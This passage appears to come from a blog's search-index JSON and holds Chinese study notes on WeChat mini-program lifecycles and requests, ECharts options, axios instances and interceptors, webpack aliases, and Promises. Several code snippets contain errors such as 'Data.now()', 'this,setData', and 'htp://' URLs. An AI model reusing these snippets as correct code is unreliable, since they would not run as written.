或 清除定时器\n\n+ onError() : 触发：应用代码发生了报错的时候\n\n  ​                  作用：收集用户的错误信息，通过异步请求，将错误信息发到后台\n\n+ onPageNotFound() : 触发：应用第一次启动时，找不到第一个入口页面\n\n  ​                                作用：通过js重新跳转到第二个首页 wx.navigateTo({url:’…’}) 不能跳转到tabbar页面\n\n\n\n#### 7.2 页面 demo.js 生命周期\n\n+ data : 页面初始数据\n\n+ onLoad : 页面加载完毕 发送异步请求初始化页面\n\n+ onShow : 页面显示 \n\n+ onReady : 页面渲染完毕\n\n+ onHide : 页面隐藏 切后台/跳链接\n\n+ onUnload : 页面卸载  点击超链接 open-type 的值中 有包含关闭页面的才ok ：redirect、reLaunch、navigateBack\n\n+ onPullDownRefresh : 监听用户的下拉刷新操作 进行页面数据 效果 的刷新操作\n\n+ onReachBottom : 监听页面上拉触底事件 需要让页面 上下滚动 \n\n+ onShareAppMessage : 点击右上角转发操作\n\n+ onPageScroll : 页面滚动\n\n+ onResize : 页面尺寸发生改变 小程序 横屏/竖屏切换 \n\n  > 开启页面横批 在页面的json文件 ＋\n  >\n  > { “pageOrientation”:”auto”}\n  >\n  > 然后在模拟器中就可以找到 切换模式 按钮\n\n+ onTabItemTap : 当前页面 tabbar 页面 点击自己的 tab 键时\n\n\n\n## 8.异步请求\n\n### 8.1 使用 wx-request \n\n[官网位置](https://developers.weixin.qq.com/miniprogram/dev/api/network/request/wx.request.html)\n\n一般将异步请求写在页面周期函数的 onLoad 里\n\n<img src=\"https://s1.328888.xyz/2022/04/09/XaECy.jpg\">\n\n~~~js\n//index.js\nPage({\n  onLoad: function (options) {\n    wx.request({\n      url: 'https://service-dxtrccme-1302998929.gz.apigw.tencentcs.com/release/accordin',\n      success: (result) => {\n        console.log(result);\n      },\n      fail: (err) => { console.log(err); },\n      complete: () => { }\n    });\n  },\n})\n\n\n//to be function\nPage({\n  onLoad: function (options) {\n    getSiwperImage()\n  },\n  getSwiperImage(){\n    wx.request({\n      url: 'https://service-dxtrccme-1302998929.gz.apigw.tencentcs.com/release/accordin',\n      success: (result) => {\n        console.log(result);\n      },\n      fail: (err) => { console.log(err); },\n      complete: () => { }\n    });\n  }\n})\n~~~\n\n\n\n### 8.2 优化异步请求es6 promise \n\n> 方便嵌套\n\n1. 在 request 新建 index.js 到处 封装好的 Promise 的request\n2. 在要用到 异步请求 的页面 index.js 导入 request 用来发送请求的方法\n\n~~~js\n//在 request 新建 index.js\nexport const request = (params) => {\n  return new Promise((resolve, reject) => {\n    wx.request({\n      ...params,\n      success: (res) => {\n        resolve(res);\n      },\n      fail: (err) => {\n        reject(err)\n      }\n    })\n  })\n}\n~~~\n\n~~~js\n//页面 index.js \nimport { request } from '../../request/index.js'\nPage({\n onLoad: function (options) {\n    request({ url: 'https://service-dxtrccme-1302998929.gz.apigw.tencentcs.com/release/accordin' }).then(res => {\n      this.setData({\n        swiperlist: res.data.data\n      })\n    })\n },\n})\n~~~\n\n\n\n### 8.3 提取公共接口路径\n\n~~~js\n//在 request 新建 index.js\nexport const request = (params) => {\n    //定义公共接口路径\n  const baseUrl = 'https://...'\n  return new Promise((resolve, reject) => {\n    wx.request({\n      ...params,\n       \n      url:baseUrl+params.url,  \n        \n      success: (res) => {\n        resolve(res);\n      },\n      fail: (err) => {\n        reject(err)\n      }\n    })\n  })\n}\n~~~\n\n\n\n### 8.4 es7 的 async 语法\n\nes7 的 async 号称是解决 回调的 最终方案\n\n异步 -> 同步\n\n> 因为小程序 明确指明支持 es6 -> es5\n>\n> 所以写es7 语法会比较麻烦 如果设配比较旧 设备的时候 还是用es6 的promise\n\n1. 小程序开发工具中，勾选 es6 转 es5 语法\n2. [下载facebook的regenerator库中的](https://github.com/facebook/regenerator/blob/master/packages/runtime/runtime.js)\n3. 在小程序目录新建文件 lib/runtime/runtime.js 将代码拷贝进去\n4. 在需要使用anync的地方引入 import regeneratorRuntime from ‘../../lib/runtime/runtime’\n\n\n\n~~~js\n//第9 本地存储 中 有一个 function getCates()  将这个方法 使用async 和 await\n//也用上了baseurl\nimport regeneratorRuntime from ‘../../lib/runtime/runtime’\n\nasync getCates(){\n    //1.使用es7 的 async await发送请求  \n     const res = await request({ url:\"/categories\" });\n     this.Cates = res.data.message;\n             \n     // 把接口中的数据存入本地存储\n     wx.setStorageSync(\"cates\",{time:Data.now(),data:this.Cates});\n   \n     let leftMenuList = this.Cates.map(v => v.cat_name);\n     let rightMenuList = this.Cates[0].children;\n     this,setData({\n          leftMenuList,\n          rightMenuList\n      })\n}\n~~~\n\n\n\n### 8.5 将显示加载中的logo封装在请求中\n\n加载中的[官方文档](https://developers.weixin.qq.com/miniprogram/dev/api/ui/interaction/wx.showLoading.html)\n\n~~~js\n//计同时发送请求的数据\nlet ajaxtime = 0;\nexport const request = (params) => {\n   ajaxtime++;\n  //显示加载中\n  wx.showLoading({\n      title:\"加载中\",\n      mask:true\n  })\n    \n  //定义公共接口路径\n  const baseUrl = 'https://...'\n  return new Promise((resolve, reject) => {\n    wx.request({\n      ...params,\n       \n      url:baseUrl+params.url,  \n        \n      success: (res) => {\n        resolve(res);\n      },\n      fail: (err) => {\n        reject(err)\n      },\n        \n      complete:() => {\n          ajaxtime--;\n          //无论 所以同步请求都完成  成功还是失败 都执行\n          //关闭加载\n          if(ajaxtime === 0){\n              wx.hideLoading();\n          }\n          \n      }\n    })\n  })\n}\n\n~~~\n\n\n\n### 8.6 request 封装中增加 header 头部信息\n\n~~~js\n//计同时发送请求的数据\nlet ajaxtime = 0;\nexport const request = (params) => {\n    //判断url 中的特点 if 有 /my/ 就得加 header 私有路径\n    let header = {...params.header};\n    if(params.url.includes(\"/my/\")){\n        //拼接\n        header[\"Authorization\"] = wx.getStorageSync(\"token\");\n    }\n    \n    \n   ajaxtime++;\n  //显示加载中\n  wx.showLoading({\n      title:\"加载中\",\n      mask:true\n  })\n    \n  //定义公共接口路径\n  const baseUrl = 'https://...'\n  return new Promise((resolve, reject) => {\n    wx.request({\n      ...params,\n       \n      url:baseUrl+params.url,  \n        \n      success: (res) => {\n        resolve(res);\n      },\n      fail: (err) => {\n        reject(err)\n      },\n        \n      complete:() => {\n          ajaxtime--;\n          //无论 所以同步请求都完成  成功还是失败 都执行\n          //关闭加载\n          if(ajaxtime === 0){\n              wx.hideLoading();\n          }\n          \n      }\n    })\n  })\n}\n\n~~~\n\n\n\n\n\n## 9.本地存储\n\nweb 与 小程序 中 本地存储的区别\n\n+ 代码 web：localStorage.setItem(“key”,”value”)\n\n  ​                 localStorage.getItem(“key”)\n\n  ​       小程序：wx.setStorageSync(“key”,”value”)\n\n  ​                     wx.getStorageSync(“key”)\n\n+ 存的时候 是否会做类型转换\n\n  ​     web：存数据时 会调用toString() 把数据转换成字符串\n\n  ​    小程序：不会进行数据转换  即 传的是什么数据类型 取的就是什么类型的\n\n\n\n小程序本地存储的过程\n\n1. 判断本地存储 有无旧数据  {time:Data.now() , data:[…]}\n2. if 无旧数据 直接发送请求 存入 本地存储\n3. if 有 同时 旧数据没有过期 就直接使用本地存储的数据\n\n\n\n~~~js\nPage({\n    data(){\n        leftMenuList:[],\n        rightMenuList:[]\n    },\n    Cates:[],\n    onLaod():function(options){\n    \t//1.获取本地存储中的数据 \n    \tconst Cates = wx.getStorageSync(\"cates\");\n    \t//2.判断\n    \tif(!Cates){\n            //发送请求\n            this.getCates();\n        }else{\n            //是否过期  10s  \n            if(Data.now() - Cates.time > 1000 * 10){\n                //过期 发送请求\n                this.getCates();\n            }else{\n                //使用旧数据\n                this.Cates = Cates.data;\n                let leftMenuList = this.Cates.map(v => v.cat_name);\n                let rightMenuList = this.Cates[0].children;\n                this,setData({\n                    leftMenuList,\n                    rightMenuList\n                })\n            }\n        }\n\t},\n    //获取数据\n     getCates(){\n         request({url:\"...\"}).then(res => {\n             this.Cates = res.data.message;\n             \n             // 把接口中的数据存入本地存储\n             wx.setStorageSync(\"cates\",{time:Data.now(),data:this.Cates});\n             \n             \n             let leftMenuList = this.Cates.map(v => v.cat_name);\n             let rightMenuList = this.Cates[0].children;\n             this,setData({\n                 leftMenuList,\n                 rightMenuList\n             })\n         })\n     }\n})\n~~~\n\n\n\n## 10 效果\n\n### 10.1 previewImage[将图片放大预览](https://developers.weixin.qq.com/miniprogram/dev/api/media/image/wx.previewImage.html)\n\nwx.previewImage({\n  \t\t\tcurrent: '', // 当前显示图片的http链接\n  \t\t\turls: [] // 需要预览的图片http链接列表\n\t\t})\n\n\n\n### 10.2 showToast[显示弹框](https://developers.weixin.qq.com/miniprogram/dev/api/ui/interaction/wx.showToast.html)\n\nwx.showToast(){\n\n​\ttitle:””,\n\n​\ticon:””,\n\n​\tmask:true //防抖\n\n}\n\n\n\n### 10.3 getSetting[获取权限状态](https://developers.weixin.qq.com/miniprogram/dev/api/open-api/setting/wx.getSetting.html)\n\nwx.getSetting({\n\n​\tsuccess:(res) => {\n\n​\t\t\t\n\n​\t}\n\n})\n\n\n\n### 10.4 chooseAddress[获取收货地址]()\n\n之前有过的\n\nwx.chooseAddress({\n\n​\tsuccess:(res) => {\n\n​\t\t…\n\n​\t}\n\n})\n\n\n\n### 10.5 showModal [显示弹窗](https://developers.weixin.qq.com/miniprogram/dev/api/ui/interaction/wx.showModal.html)\n\nwx.showModal({\n  \t\ttitle: '提示',\n  \t\tcontent: '这是一个模态弹窗',\n  \t\tsuccess (res) {\n    \t\t\tif (res.confirm) {\n      \t\t\t\tconsole.log('用户点击确定')\n    \t\t\t} else if (res.cancel) {\n      \t\t\t\tconsole.log('用户点击取消')\n    \t\t\t}\n  \t\t}\n\t\t})\n\n\n\n### 10.6 支付\n\n+ 支付流程 ：创建订单 -> 准备支付 -> 发起微信支付 -> 查询订单\n\n\n\n### 10.7 chooseImage [选择图片](https://developers.weixin.qq.com/miniprogram/dev/api/media/image/wx.chooseImage.html)\n\nwx.chooseImage({\n\n​\tcount:9,   //同时选择的最大图片数量\n\n​\tsizeType:[‘original’ , ‘compressed’],   //图片格式  原图 压缩\n\n​\tsourceType:[‘album’ , ‘camera’],  //图片来源 相册 照相机\n\n​\tsuccess:(result) => {\n\n​\t\tthis.Data({\n\n​\t\t\tchooseImages = […this.data.chooseImages,…result.tempFilePaths]    //拼接 图片数组\n\n​\t\t})\n\n​\t}\n\n})\n\n\n\n","tags":["小程序"],"categories":["learningNotes"]},{"title":"EChart的使用","url":"/learningNotes/ECharts的使用","content":"\n## 1. EChart的使用(2021/07/01 pink老师)\n\n### 1.1 使用步骤\n\n1. 下载并导入echarts.js文件 (@4.9.0 才有地图)\n\n   > 有多种导入方式 使用直接下载文件然后导入就可以了[下载地址](https://echarts.apache.org/zh/download.html)\n\n2. 准备一个有宽高的DOM容器\n\n3. 初始化echarts实例\n\n   > const mychart = echarts.init(document.querySelector('.box'));\n\n4. 指定配置项和数据option\n\n   >  let option = { … }\n\n5. 将配置项设置给echarts实例对象\n\n   > mychart.setOption(option);\n\n\n\n### 1.2 基础配置 \n\n> option里面的配置\n\n+ `title`: 设置图表标题\n\n+ `tooltip`: 提示框组件\n  + `trigger`: 触发方式\n    + 值为`axis`时鼠标在坐标轴上时触发\n  + `axisPointer`： 坐标轴指示器\n    + 值默认为`line` 也可以设置成`shadow`\n+ `legend`：图例组件\n  + `textStyle`: 图例文字的样式\n    + `color`\n  + `left、right、top、bottom`: 图例位置\n+ `toolbox`： 工具箱组件 可以保存图片什么的\n+ `color`： 后面的值是数组形式 线条的颜色\n\n> 直角坐标系的配置\n\n+ `grid`: 网格 – 控制线型图 柱状图 图表的大小\n\n  + `left、right、top、bottom`： 控制大小\n  + `containLabel`: 显示刻度标签\n\n+ `xAxis`： 设置x轴的配置\n\n  + `type`： `category` 类目、`value`值\n  + `boundaryGap`:线条与坐标轴是否有缝隙\n  + `data`：x轴的相关显示信息\n  + `axisLabel`: 刻度标签的相关样式 有文字颜色 大小 样式什么的\n  + `axisLine`： 坐标轴那条线的样式\n    + `show`：表是否显示\n\n+ `yAxis`: y轴的配置\n\n  + `axisLine`： 坐标轴那条线的样式 if要设置样式\n\n    + `lineStyle`: 在里面配置样式\n\n  + `axisTick`: 坐标轴的刻度\n\n    + `show` : 是否显示\n\n  + `splitLine`: y轴分割线的样式\n\n    + `lineStyle`:\n\n    \n\n+ `series`: 系列图表的配置 决定显示哪种类型的图表\n\n  + `stack`: if值相同 会发生数据堆叠\n\n  + `name`: 与上legend的数组相同 if有name可不用legend\n\n  + `barWidth`: 柱子的宽度\n\n  + `barCategoryGap`: 柱子距离\n\n  + `label`: 显示柱子内的文字\n\n    + `show` : 是否显示\n    + `position` : `“inside”`\n    + `formatter` : `“{c}%” `  //c 数据值 b 数据名 a系列名 会自动解析为data里的数据\n\n  + `itemStyle`: 每个柱子的样式\n\n    + `barBorderRadius`：圆角边框\n\n    + `color`：\n\n      >一般来说只能有一个颜色，就算是数组形式 也只会展示最后一个颜色\n      >\n      >如果想要展示多个的话 可以\n      >\n      >先\n      >\n      >~~~js\n      >const mycolor = [\"pink\", \"blue\", \"yellow\", \"white\", \"black\"]\n      >//然后在里面\n      >color:function(params){\n      >// params传进来的是柱子对象    \n      >    return mycolor[params.dataIndex]\n      >}\n      >~~~\n      >\n      >\n      >\n      >如果想要展示一个框\n      >\n      >~~~js\n      >color:\"none\",\n      >borderColor:\"pink\",\n      >~~~\n      >\n      >\n\n  \n\n  <img src='https://s1.328888.xyz/2022/04/09/XkQud.jpg'>\n\n\n\n### 1.3 柱形图\n\n##### 更改对应数据\n\n横坐标的数据：`axis` 的`data`\n\n纵坐标的数据: `series` 的`data`\n\n使图表跟屏幕大小做自适应\n\n~~~js\nwindow.addEventListener(\"resize\",function(){\n    myChary.resize();\n})\n~~~\n\n#####  实现两组柱子层叠\n\n在series里的两个柱子对象里\n\n使用`yAxisIndex:0`和`yAxisIndex:1` 在不同的柱子上\n\n##### 坐标轴数组反转\n\n在yAxis里`inverse:true`\n\n\n\n### 1.4 折线图（2021/7/6）\n\n##### 改线的颜色\n\noption里直接加`color:[“”]`\n\n##### 将折线改圆滑\n\n在series里要平滑显示的线条对象 加上`smooth:true`\n\n##### 单独改变线的样式\n\n在series里 `lineStyle:{...}`\n\n##### 渐变色填充区域\n\n在series里\n\n~~~js\nareaStyle:{\n    // 渐变色，只需要复制即可\n    color:new echarts.graphic.LinearGradient(0,0,0,1,\n          [{\n              offset:0,\n              color:\"rgba(1,132,213,0.4)\"  //起使颜色\n          },{\n              offset:0.8,\n              color:\"rgba(1,132,213,0.1)\"  //结束颜色\n          }],false),\n        shadowColor:\"rgba(0,0,0,0.1)\"\n},\n~~~\n\n##### 拐点\n\n在series里\n\n`symbol:\"circle\"`\n\n`symbolSize:12`\n\n`showSymbol:false` 一开始不显示，鼠标经过才显示\n\n`itemStyle:{color:\"\" , borderColor:\"\" , borderWidth: \"\"}`拐点的样式\n\n\n\n### 1.5 饼形图\n\n##### 触发方式\n\n`tooltip:{ trigger: 'item', ...}`\n\n鼠标悬停饼\n\n##### 鼠标悬停部分饼状 中间出现文字\n\n~~~js\nseries:[\n    { \n        ... , \n        emphasis:{ \n        \tlabel:{\n        \t\tshow:true,\n        \t\tfontSize：’30‘,\n        \t\t...\n    \t\t}\n    \t},\n    \t...\n    } \n]\n~~~\n\n##### 修改图例\n\n~~~js\nlegend:{\n    bottom:\"5%\", //图例位置\n    itemWidth/itemHeight:10, //图标大小\n    textStyle:{} //修改图例文字\n}\n~~~\n\n##### 修改在容器中的位置\n\n`series:[ { center:[ \"50%\" , \"50%\" ] } ]`\n\n##### 修改饼形大小\n\n`series:[ { radius:[ \"40%\" , \"50%\" ] } ]`\n\n内圆半径，外圆半径\n\n##### 模式\n\n`series:[ { roseType:\"radius/area\" } ] //半径模式 / 面积模式`\n\n##### 图形的文字 和 线\n\n~~~js\nseries:[ \n    { \n    \tlabel:{\n          \tfontSize:10  \n        },\n        labelLine:{\n        \tlength:50 //链接图形的线\n        \tlength2:10  //链接文字的线条\n    \t}\n    } \n]\n~~~\n\n\n\n### 1.6 EChart社区 \n\n### 1.7 地图\n\n先引入地图js\n\n##### 改变鼠标悬停后的颜色\n\n~~~js\ngeo:{\n    normal:{\n        areaColor:\"pink\",\n        borderColor:\"...\"\n        borderWidth:1\n    }\n}\n~~~\n\n##### 改变大小\n\n`geo:{ zoom: 1.2 }`\n\n\n\n\n\n\n\n\n\n\n\n","tags":["js组件"],"categories":["learningNotes"]},{"title":"10 axios","url":"/learningNotes/vue/10 axios","content":"\n[toc]\n\n## 1.axios功能特点\n\n+ 在浏览器中发送XMLHttpRequests请求\n+ 在node.js中发送http请求\n+ 支持Promise API\n+ 拦截请求和响应\n+ 转换请求和响应数据\n\n## 2.axios请求方式\n\n+ `axios(config)` 默认get请求\n+ `axios.request(config)`\n+ `axios.get(url[,config])`\n+ `axios.delete(url[,config])`\n+ `axios.head(url[,config])`\n+ `axios.post(url[,data[,config]])`\n+ `axios.put(url[,data[,config]])`\n+ `axios.patch(url[,data[,config]])`\n\n\n\n## 3.axios框架的基本使用\n\n接口：http://123.207.32.32:8000/home/multidata\n\naxios默认是get方法\n\n~~~js\n//get请求\naxios({\n    url:\"http://123.207.32.32:8000/home/multidata\"\n}).then(res => {\n    console.log(res)\n})\n\n//带参数\naxios({\n    url:\"http://123.207.32.32:8000/home/data?type=pop&page=1\"\n}).then(res => {\n    console.log(res)\n})\n\n//get请求的参数拼接\naxios({\n    url:\"http://123.207.32.32:8000/home/data\",\n    params:{\n        type:'pop',\n        page:1\n    }\n}).then(res => {\n    console.log(res)\n})\n~~~\n\n\n\n## 2.axios发送并发请求\n\n~~~js\naxios.all([axios({\n        url: \"http://123.207.32.32:8000/home/multidata\"\n    }), axios({\n        url: \"http://123.207.32.32:8000/home/data\",\n        params: {\n            type: 'pop',\n            page: 2\n        }\n    })])\n    .then(results => {\n         console.log(results);\n    });\n\n// 使用axios.spread可将数组[res1,res2]展开\naxios.all([axios({\n        url: \"http://123.207.32.32:8000/home/multidata\"\n    }), axios({\n        url: \"http://123.207.32.32:8000/home/data\",\n        params: {\n            type: 'pop',\n            page: 2\n        }\n    })])\n    .then(axios.spread((res1, res2) => {\n        console.log(res1);\n        console.log(res2);\n    }))\n~~~\n\n\n\n## 3.全局配置\n\n因为BaseURL是固定的，可以抽取/利用axios的全局配置\n\n~~~js\n// 3.全局配置 \n//超时 ms\naxios.defaults.baseURL = \"http://123.207.32.32:8000\"\naxios.defaults.timeout = 5\n\n//get请求\naxios({\n    url: \"/home/multidata\"\n}).then(res => {\n    // console.log(res);\n})\n~~~\n\n\n\n### 3.2常见的配置选项\n\n如果是put  params\n\n如果是post data\n\n<img src='https://s1.328888.xyz/2022/04/09/XaK8e.jpg'>\n\n\n\n## 4.axios实例和模块封装\n\n### 4.1如果有多个请求接口时 使用实例会比较好\n\n~~~js\n//main.js\n// 4.创建对应的实例\nconst instance1 = axios.create({\n    baseURL = \"htp://123.207.32.32:8000\",\n    timeout: 5000\n})\n\ninstance1({\n    url: \"/home/multidata\"\n}).then(res => {\n    console.log(res);\n})\n\ninstance1({\n    url: \"/home/data\",\n    params: {\n        type: 'pop',\n        page: 1\n    }\n}).then(res => {\n    console.log(res);\n})\n\n\nconst instance2 = axios.create({\n  baseURL = \"htp://123.207.33.11:8000\",\n  timeout: 5000\n})\n\n~~~\n\n\n\n### 4.2 模块封装\n\n如果有个第三方的东西需要导入，不要每一个组件都导入这个第三方框架，这样每个页面对这个框架依赖性太强了，如果有一天这个第三方的东西不再维护了，所有页面都得换掉\n\n所以尽量封装成一个文件，这样改的话就改一个文件的就可以了\n\n#### 4.2.1.每个页面都导入的情况\n\n~~~js\n//vue\n<h2>{{ categories }}</h2>\nimport axios from 'axios'\nexport default {\n    name:\"HelloWorld\",\n    data(){\n        return {\n            categories:\"\"\n        }\n    },\n    //生命周期函数  组件创建好后 发送请求\n    created(){\n        axios({\n            url:\"http://123.207.32.32:8000/category\"\n        }).then(res => {\n            this.categories = res;\n        })\n    }\n}\n~~~\n\n\n\n#### 4.2.2 封装\n\n##### 4.2.2.1 src建文件夹 network 建request.js\n\n~~~js\n//request.js\nimport axios from \"axios\";\nexport function request(config, success, failure) {\n    // 1.创建axios的实例\n    const instance = axios.create({\n        baseURL: \"http://123.207.32.32:8000\",\n        timeout: 5000\n    })\n\n    // 发送真正的网络请求\n    // 通过两个函数 吧把结果回调出去\n    instance(config).then(res => {\n        console.log(res);\n        success(res)\n    }).catch(err => {\n        console.log(err);\n        failure(err)\n    })\n}\n\n//main.js\n//5.封装reque模块\nimport { request } from './network/request'\n\nrequest({\n    url: '/home/multidata'\n}, res => {\n    console.log(res);\n}, err => {\n    console.log(err);\n})\n~~~\n\n\n\n##### 4.2.2.2 另一种封装方法：\n\n~~~js\n//request.js\nimport axios from \"axios\";\nexport function request(config) {\n    // 1.创建axios的实例\n    const instance = axios.create({\n        baseURL: \"http://123.207.32.32:8000\",\n        timeout: 5000\n    })\n\n    instance(config.baseConfig).then(res => {\n        config.success(res)\n    }).catch(err => {\n        config.failure(err)\n    })\n}\n\n//mian.js\nrequest({\n    baseConfig:{\n        \n    },\n    success:function(res){\n        \n    },\n    failure:function(err){\n        \n    }\n})\n~~~\n\n\n\n##### 4.2.2.3 推荐使用promise\n\n~~~js\n//request.js\nimport axios from \"axios\";\nexport function request(config, success, failure) {\n    // 1.创建axios的实例\n    const instance = axios.create({\n        baseURL: \"http://123.207.32.32:8000\",\n        timeout: 5000\n    })\n\n    instance(config).then(res => {\n        console.log(res);\n        success(res)\n    }).catch(err => {\n        console.log(err);\n        failure(err)\n    })\n}\n\n//main.js\nrequest({\n    url:\"/home/multidata\"\n}).then(res => {\n    console.log(res);\n}).catch(err => {\n    console.log(err);\n})\n~~~\n\n\n\n##### 4.2.2.4  最终使用 axios的实例的返回值就是promise\n\n> 因为instance可以直接使用.then .catch方法\n\n~~~js\n//request.js\nimport axios from \"axios\";\nexport function request(config) {\n        // 1.创建axios的实例\n        const instance = axios.create({\n            baseURL: \"http://123.207.32.32:8000\",\n            timeout: 5000\n        })\n        //发送真正的网络请求\n       return instance(config)\n}\n\n//main.js\nrequest({\n    url:\"/home/multidata\"\n}).then(res => {\n    console.log(res);\n}).catch(err => {\n    console.log(err);\n})\n~~~\n\n> 如果到时候axios不能用了，只需要改4-10行的代码就可以 了\n\n\n\n## 5.axios拦截器\n\n四种拦截器：请求成功/失败 、响应成功/失败：服务器没有具体是数据过来，传了错误码\n\n~~~js\nexport function request(config) {\n    // 1.创建axios的实例\n    const instance = axios.create({\n        baseURL: \"http://123.207.32.32:8000\",\n        timeout: 5000\n    })\n\n    // 2.axios的拦截器\n    // 全局 axios.interceptors\n    // 实例 instance.interceptors\n    // 请求拦截\n    instance.interceptors.request.use(config => {\n        console.log(config); //拦截下来的是配置 拦截了配置还得给返回回去 不然就会请求失败\n        // 1.可以通过拦截的形式给config中的一些信息不符合服务器要求 设置header什么的\n        // 2.可能在请求时 show 加载中的图标\n        // 3.某些网络请求 是必须携带一些信息 例如登录 带token\n        return config;\n    }, err => {\n        console.log(err);\n    });\n    // 响应拦截\n    instance.interceptors.response.use(res => {\n        //因为一般用的时候只用data就可以了\n        // 拦截了结果得返回出去 不然main.js log.res时undefined\n        // console.log(res);\n        return res.data;\n\n    }, err => {\n        console.log(err);\n    });\n\n    // 3.发送真正的网络请求\n    return instance(config)\n}\n~~~\n\n\n\n","tags":["vue"],"categories":["learningNotes"]},{"title":"路径别名配置","url":"/learningNotes/vue/07 封装tabbar的知识","content":"\n[toc]\n\n 在webpack.base.conf.js 里\n\n ~~~js\n resolve:{\n     extensions:['.js','.vue','.json'],\n     alias:{\n         '@':resolve('src'),\n         'assets':resolve('src/assets'),\n         'components':resolve('src/components'),\n         'views':resolve('src/views'),\n     }\n }\n ~~~\n\n 使用时：\n\n ~~~vue\n <template>\n \t<img solt='item-icon' src='~assets/img/tabbar/home.svg'>\n </template>\n ~~~\n \n\n","tags":["vue"],"categories":["learningNotes"]},{"title":"Promise 简述","url":"/learningNotes/vue/08 Promise","content":"\n\n## 1. Promise简介\n\n+ Promise 是异步编程的一种解决方案\n\n## 2. 网络请求的回调地狱\n\n> 简述：\n>\n> 需要通过url1从服务器加载一个数据data1，data1中包含了下一个请求的url2；\n>\n> 需要通过data1取出url2，从服务器加载数据data2，data2包含了下一个请求的url3；\n>\n> 需要通过data2取出url3，从服务器加载数据data3，data3包含了下一个请求的url4；\n>\n> 发送网络请求url4，获取最终的数据data4\n\n~~~js\n$.ajax('url1',function(data1){\n    $.ajax(data1['url2'],function(data2){\n        $.ajax(data1['url3'],function(data3){\n        \t$.ajax(data1['url4'],function(data4){\n        \t\tconsole.log(data4);\n    \t\t})\n    \t})\n    })\n})\n~~~\n\n> 这样的代码难看且不易维护\n>\n> 更加期望用一种更加优雅的方式来进行这种异步操作——promise\n\n\n\n## 3.定时器的异步事件\n\n> 使用定时器模拟异步操作\n>\n> ~~~js\n> // 1. 使用setTimeout\n> setTimeout(function(){\n>     let data = 'Hello World'\n>     console.log(data);\n> },1000)\n> ~~~\n\n上述是我们过去的处理方式，将其转换成promise代码：\n\n~~~js\n// 参数 -> 函数(resolve,reject)\n// resolve,reject本身也是函数\n// 链式编程\nnew Promise((resolve,reject) => {\n    setTimeout(function(){\n        //成功时调用 resolve\n        resolve('Hello World')\n        //失败时 调用reject\n        reject('Error Data')\n    },1000)\n}).then(data => {\n    console.log(data);\n}).catch(error => {\n    console.log(error);\n})\n~~~\n\n+ 什么时候会用到promise？\n\n  一般是有异步操作时，使用promise对这个异步操作进行封装\n\n+ 怎么使用\n\n  new -> 构造函数（1.保存了一些状态信息 2.执行传入的函数）\n\n  在执行传入的回调函数时，会传入两个参数，resolve，reject，其本身也是函数\n\n\n\n## 3.Promise三种状态\n\n+ 在开发中有异步操作时，就可以给异步操作包装一个Promise。异步操作之后会有三种状态:\n  + pending：等待状态，如：正在进行网路请求，或者定时器没有到时间\n  + fulfill：满足状态，当主动回调了resolve时，就处于该状态，并且会回调.then()\n  + reject：拒绝状态，当主动回调了reject时，就处于该状态，并且会回调.catch()\n\n~~~js\n// promise 的另外处理形式\nnew Promise((resolve,reject) =>{\n    setTimeout(() => {\n        resolve('Hello Vuejs')\n        // reject('error message')\n    },1000)\n}).then(data => {\n    console.log(data);\n},err => {\n    console.log(err)\n})\n~~~\n\n\n\n## 4 Promise 链式调用\n\n+ 在Promise的流程图中，无论时then还是catch都可以返回一个Promise对象\n+ 所以，代码可以进行链式调用：\n  + 直接通过Promise包装新的数据，将Promise对象返回\n  + Promise.resolve()：将数据包装成Promise对象，并且在内部调用回调resolve()函数\n  + Promise。reject()：将数据包装成Promise对象，并且在内部回调reject()函数\n\n~~~js\n//wapped into \n//网络请求：aaa -> 自己处理\n// 处理: aaa111 -> 自己处理\n// 处理: aaa111222 -> 自己处理\n\nnew Promise((resolve,reject) => {\n    setTimeout(() => {\n        resolve('aaa')\n    },1000)\n}).then(res => {\n    //自己处理\n    console.log(res)\n    \n    //对结果进行第一次处理\n    return new Promise((resolve) => {\n        resolve(res + '111')\n    })\n}).then(res => {\n     //自己处理\n    console.log(res)\n    \n    //对结果进行第二次处理\n    return new Promise((resolve) => {\n        resolve(res + '222')\n    })\n}).then(res => {\n    console.log(res)\n}).catch(err => {\n    console.log(err)\n})\n~~~\n\n\n\n链式调用简写\n\n+ if希望数据直接包装成Promise.resolve，那么在then中可以直接返回数据\n+ 当把return Promise.resolve(data) 改成return data时结果也是一样的\n\n~~~js\n    //对结果进行第一次处理\n    return new Promise((resolve) => {\n        resolve(res + '111')\n    })\n\n\t// 1. 使用return Promise.resolve/reject\n\treturn Promise.resolve(res + '111')\n\t/\n    return Promise.reject('error message')  \n\n\t// 2. 省略Promise.resolve\n\treturn res + '111'\n\t/ \n    throw 'error message'\n~~~\n\n\n\n## 5. 链式调用二\n\n> 简述：如果一个结果需要两个请求成功后才能得到\n>\n> 那没有使用Promise时是这样的\n\n~~~js\nlet isResult1 = false;\nlet isResult2 = false;\n\n//请求1\n$.ajax({\n    url:'',\n    success:function(){\n        console.log('result1');\n        isResult1 = true;\n        handleResult()\n    }\n})\n\n//请求2\n$.ajax({\n    url:'',\n    success:function(){\n        console.log('result2');\n        isResult2 = true;\n        handleResult()\n    }\n})\n\nfunction handleResult(){\n    if(isResult1 && isResult2){\n        \n    }\n}\n~~~\n\n**Promise.all**\n\n使用Promise\n\n~~~js\nPromise.all([\n    new Promise((reslove,reject) => {\n        $.ajax({\n            url:'',\n            success:function(data){\n                resolve(data)\n            }\n        })\n    }),\n    new Promise((resolve,reject) => {\n        $.ajax({\n            url:'',\n            success:function(data){\n                resolve(data)\n            }\n        })\n    })\n]).then(results => {\n    results[0]\n    results[1]\n})\n~~~\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["js","es6"],"categories":["learningNotes"]},{"title":"09 Vuex","url":"/learningNotes/vue/09 Vuex","content":"\n[toc]\n\n\n## 1.Vue的概念和作用解析\n\n### 1.1 Vuex 是做什么的\n\n官方解释：Vuex是一个专门为Vue.js应用程序开发的状态管理模式。\n\n采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。\n\nVuex也集成到Vue的官方调试工具`devtools extension`，提供了诸如零配置的`time-travel`调试、状态快照导入导出等高级调试功能。\n\n> 状态管理模式相当于 封装一个大家都能访问的对象里 但Vuex跟自己封装的对象不一样的就是Vuex 实现了响应式\n>\n> `Vuex就是为了提供这样一个在多个组件间共享状态的插件`\n\n\n\n### 1.2 